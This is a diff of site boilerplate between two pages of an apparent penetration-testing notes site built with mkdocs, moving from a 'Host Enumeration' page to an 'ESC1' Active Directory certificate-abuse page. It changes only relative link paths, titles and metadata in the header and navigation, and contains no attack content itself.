@@ -8,28 +8,28 @@
       
       
       
-        <link rel="canonical" href="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Host%20Enumeration/">
+        <link rel="canonical" href="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/ADCS/ESC1/">
       
       
-        <link rel="prev" href="../Group%20Membership/">
+        <link rel="prev" href="../../Silver%20Ticket/">
       
       
-        <link rel="next" href="../Living%20Off%20the%20Land%20Enumeration/">
+        <link rel="next" href="../Enumerate%20ADCS/">
       
       
-      <link rel="icon" href="../../../assets/favicon.ico">
+      <link rel="icon" href="../../../../../assets/favicon.ico">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.17">
     
     
       
-        <title>Host Enumeration - jacobh.io</title>
+        <title>ESC1 - jacobh.io</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.7e37652d.min.css">
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.7e37652d.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.06af60db.min.css">
       
       
 
@@ -48,7 +48,7 @@
       
     
     
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -57,11 +57,11 @@
       
         <meta  property="og:type"  content="website" >
       
-        <meta  property="og:title"  content="Host Enumeration - jacobh.io" >
+        <meta  property="og:title"  content="ESC1 - jacobh.io" >
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/1. Reconnaissance & Enumeration/Host Enumeration.png" >
+        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/4. Privilege Escalation/Domain/ADCS/ESC1.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -69,15 +69,15 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/1.%20Reconnaissance%20%26%20Enumeration/Host%20Enumeration/" >
+        <meta  property="og:url"  content="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/ADCS/ESC1/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
-        <meta  name="twitter:title"  content="Host Enumeration - jacobh.io" >
+        <meta  name="twitter:title"  content="ESC1 - jacobh.io" >
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/1. Reconnaissance & Enumeration/Host Enumeration.png" >
+        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/4. Privilege Escalation/Domain/ADCS/ESC1.png" >
       
     
     
@@ -99,6 +99,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#esc1" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -109,9 +114,9 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="jacobh.io" class="md-header__button md-logo" aria-label="jacobh.io" data-md-component="logo">
+    <a href="../../../../.." title="jacobh.io" class="md-header__button md-logo" aria-label="jacobh.io" data-md-component="logo">
       
-  <img src="../../../assets/favicon.ico" alt="logo">
+  <img src="../../../../../assets/favicon.ico" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -128,7 +133,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Host Enumeration
+              ESC1
             
           </span>
         </div>
@@ -239,7 +244,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../.." class="md-tabs__link">
+      <a href="../../../../.." class="md-tabs__link">
         
   
   
@@ -258,7 +263,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../../%F0%9F%90%89%20Kali%20Setup/" class="md-tabs__link">
+      <a href="../../../../../%F0%9F%90%89%20Kali%20Setup/" class="md-tabs__link">
         
   
   
@@ -286,7 +291,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-tabs__link">
+        <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-tabs__link">
           
   
   
@@ -309,7 +314,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../%F0%9F%8C%90%20Web%20Application/" class="md-tabs__link">
+        <a href="../../../../../%F0%9F%8C%90%20Web%20Application/" class="md-tabs__link">
           
   
   
@@ -329,7 +334,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../%F0%9F%A4%93%20writeups/" class="md-tabs__link">
+        <a href="../../../../../%F0%9F%A4%93%20writeups/" class="md-tabs__link">
           
   
   
@@ -356,7 +361,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/" class="md-tabs__link">
+        <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/" class="md-tabs__link">
           
   
   
@@ -381,7 +386,7 @@
     
     
       <li class="md-tabs__item md-tabs__item--active">
-        <a href="../../" class="md-tabs__link">
+        <a href="../../../../" class="md-tabs__link">
           
   
   
@@ -415,9 +420,9 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="jacobh.io" class="md-nav__button md-logo" aria-label="jacobh.io" data-md-component="logo">
+    <a href="../../../../.." title="jacobh.io" class="md-nav__button md-logo" aria-label="jacobh.io" data-md-component="logo">
       
-  <img src="../../../assets/favicon.ico" alt="logo">
+  <img src="../../../../../assets/favicon.ico" alt="logo">
 
     </a>
     jacobh.io
@@ -444,7 +449,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../.." class="md-nav__link">
+      <a href="../../../../.." class="md-nav__link">
         
   
   
@@ -466,7 +471,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%90%89%20Kali%20Setup/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%90%89%20Kali%20Setup/" class="md-nav__link">
         
   
   
@@ -570,7 +575,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-nav__link">
+      <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/" class="md-nav__link">
         
   
   
@@ -593,7 +598,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/" class="md-nav__link">
+      <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/" class="md-nav__link">
         
   
   
@@ -616,7 +621,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Credential%20%26%20Identity%20Attacks/" class="md-nav__link">
+      <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Credential%20%26%20Identity%20Attacks/" class="md-nav__link">
         
   
   
@@ -639,7 +644,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/" class="md-nav__link">
+      <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/" class="md-nav__link">
         
   
   
@@ -662,7 +667,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Phishing%20via%20SSO%20Device%20Codes/" class="md-nav__link">
+      <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Phishing%20via%20SSO%20Device%20Codes/" class="md-nav__link">
         
   
   
@@ -685,7 +690,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/" class="md-nav__link">
+      <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/" class="md-nav__link">
         
   
   
@@ -708,7 +713,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Serverless%20Services%20Exploitation/" class="md-nav__link">
+      <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Serverless%20Services%20Exploitation/" class="md-nav__link">
         
   
   
@@ -731,7 +736,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/" class="md-nav__link">
+      <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/" class="md-nav__link">
         
   
   
@@ -754,7 +759,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/" class="md-nav__link">
+      <a href="../../../../../%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/" class="md-nav__link">
         
   
   
@@ -833,7 +838,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/" class="md-nav__link">
         
   
   
@@ -856,7 +861,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Insecure%20File%20Uploads/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Insecure%20File%20Uploads/" class="md-nav__link">
         
   
   
@@ -879,7 +884,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Verb%20Tampering/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Verb%20Tampering/" class="md-nav__link">
         
   
   
@@ -902,7 +907,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Web%20Application%20Firewall/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Web%20Application%20Firewall/" class="md-nav__link">
         
   
   
@@ -966,7 +971,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/API/-%20Getting%20Started/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/API/-%20Getting%20Started/" class="md-nav__link">
         
   
   
@@ -989,7 +994,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/API/API/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/API/API/" class="md-nav__link">
         
   
   
@@ -1012,7 +1017,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/API/Mass%20Assignment/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/API/Mass%20Assignment/" class="md-nav__link">
         
   
   
@@ -1084,7 +1089,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Access%20Control/-%20Getting%20Started/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Access%20Control/-%20Getting%20Started/" class="md-nav__link">
         
   
   
@@ -1107,7 +1112,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Access%20Control/Broken%20Function%20Level%20Access%20%28BLFA%29/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Access%20Control/Broken%20Function%20Level%20Access%20%28BLFA%29/" class="md-nav__link">
         
   
   
@@ -1130,7 +1135,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Access%20Control/Broken%20Object%20Level%20Access%20%28BOLA%29/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Access%20Control/Broken%20Object%20Level%20Access%20%28BOLA%29/" class="md-nav__link">
         
   
   
@@ -1153,7 +1158,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/" class="md-nav__link">
         
   
   
@@ -1225,7 +1230,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Authentication/-%20Getting%20Started/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Authentication/-%20Getting%20Started/" class="md-nav__link">
         
   
   
@@ -1248,7 +1253,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Authentication/Brute%20Forcing%20Authentication/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Authentication/Brute%20Forcing%20Authentication/" class="md-nav__link">
         
   
   
@@ -1271,7 +1276,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/" class="md-nav__link">
         
   
   
@@ -1294,7 +1299,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Authentication/Multi-Factor%20Authentication/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Authentication/Multi-Factor%20Authentication/" class="md-nav__link">
         
   
   
@@ -1317,7 +1322,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Authentication/Rate%20Limiting/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Authentication/Rate%20Limiting/" class="md-nav__link">
         
   
   
@@ -1340,7 +1345,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Authentication/Session%20Tokens/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Authentication/Session%20Tokens/" class="md-nav__link">
         
   
   
@@ -1412,7 +1417,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Discovery/Directory%20Fuzzing/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Discovery/Directory%20Fuzzing/" class="md-nav__link">
         
   
   
@@ -1435,7 +1440,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Discovery/Google%20Dorks/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Discovery/Google%20Dorks/" class="md-nav__link">
         
   
   
@@ -1458,7 +1463,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Discovery/Parameter%20Fuzzing/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Discovery/Parameter%20Fuzzing/" class="md-nav__link">
         
   
   
@@ -1530,7 +1535,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Directory%20Traversal/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Directory%20Traversal/" class="md-nav__link">
         
   
   
@@ -1553,7 +1558,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Filter%20Bypasses/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Filter%20Bypasses/" class="md-nav__link">
         
   
   
@@ -1576,7 +1581,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Local%20File%20Inclusion%20%28LFI%29/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Local%20File%20Inclusion%20%28LFI%29/" class="md-nav__link">
         
   
   
@@ -1599,7 +1604,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Remote%20File%20Inclusion/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Remote%20File%20Inclusion/" class="md-nav__link">
         
   
   
@@ -1671,7 +1676,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Injections/Command%20Injection/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Injections/Command%20Injection/" class="md-nav__link">
         
   
   
@@ -1694,7 +1699,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/" class="md-nav__link">
         
   
   
@@ -1717,7 +1722,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Injections/External%20Entity%20Injection%20%28XXE%29/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Injections/External%20Entity%20Injection%20%28XXE%29/" class="md-nav__link">
         
   
   
@@ -1740,7 +1745,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Injections/NoSQL%20Injection/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Injections/NoSQL%20Injection/" class="md-nav__link">
         
   
   
@@ -1763,7 +1768,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/" class="md-nav__link">
         
   
   
@@ -1786,7 +1791,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Injections/Server-Side%20Template%20Injection%20%28SSTI%29/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Injections/Server-Side%20Template%20Injection%20%28SSTI%29/" class="md-nav__link">
         
   
   
@@ -1858,7 +1863,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Request%20Forgery/Cross-Site%20Request%20Forgery%20%28CSRF%29/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Request%20Forgery/Cross-Site%20Request%20Forgery%20%28CSRF%29/" class="md-nav__link">
         
   
   
@@ -1881,7 +1886,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%8C%90%20Web%20Application/Request%20Forgery/Server%20Side%20Request%20Forgery/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%8C%90%20Web%20Application/Request%20Forgery/Server%20Side%20Request%20Forgery/" class="md-nav__link">
         
   
   
@@ -1960,7 +1965,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A4%93%20writeups/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A4%93%20writeups/" class="md-nav__link">
         
   
   
@@ -2024,7 +2029,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/" class="md-nav__link">
         
   
   
@@ -2144,7 +2149,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/" class="md-nav__link">
         
   
   
@@ -2167,7 +2172,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/" class="md-nav__link">
         
   
   
@@ -2239,7 +2244,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/" class="md-nav__link">
         
   
   
@@ -2262,7 +2267,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Misc/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Misc/" class="md-nav__link">
         
   
   
@@ -2285,7 +2290,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/" class="md-nav__link">
         
   
   
@@ -2308,7 +2313,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/PowerView/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/PowerView/" class="md-nav__link">
         
   
   
@@ -2331,7 +2336,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/SQLMap/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/SQLMap/" class="md-nav__link">
         
   
   
@@ -2354,7 +2359,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/" class="md-nav__link">
         
   
   
@@ -2418,7 +2423,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/" class="md-nav__link">
         
   
   
@@ -2441,7 +2446,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/" class="md-nav__link">
         
   
   
@@ -2464,7 +2469,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%203/" class="md-nav__link">
         
   
   
@@ -2487,7 +2492,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/" class="md-nav__link">
         
   
   
@@ -2559,7 +2564,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/ACLs/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/ACLs/" class="md-nav__link">
         
   
   
@@ -2582,7 +2587,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Capabilities/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Capabilities/" class="md-nav__link">
         
   
   
@@ -2605,7 +2610,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Credential%20Hunting/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Credential%20Hunting/" class="md-nav__link">
         
   
   
@@ -2628,7 +2633,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Environment%20Hunting/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Environment%20Hunting/" class="md-nav__link">
         
   
   
@@ -2651,7 +2656,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/General%20Information/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/General%20Information/" class="md-nav__link">
         
   
   
@@ -2674,7 +2679,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Groups/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Groups/" class="md-nav__link">
         
   
   
@@ -2697,7 +2702,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Low-Level%20Exploits/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Low-Level%20Exploits/" class="md-nav__link">
         
   
   
@@ -2720,7 +2725,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/NFS%2C%20Samba%2C%20Network%20Shares/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/NFS%2C%20Samba%2C%20Network%20Shares/" class="md-nav__link">
         
   
   
@@ -2743,7 +2748,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Permissions/" class="md-nav__link">
+      <a href="../../../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Permissions/" class="md-nav__link">
         
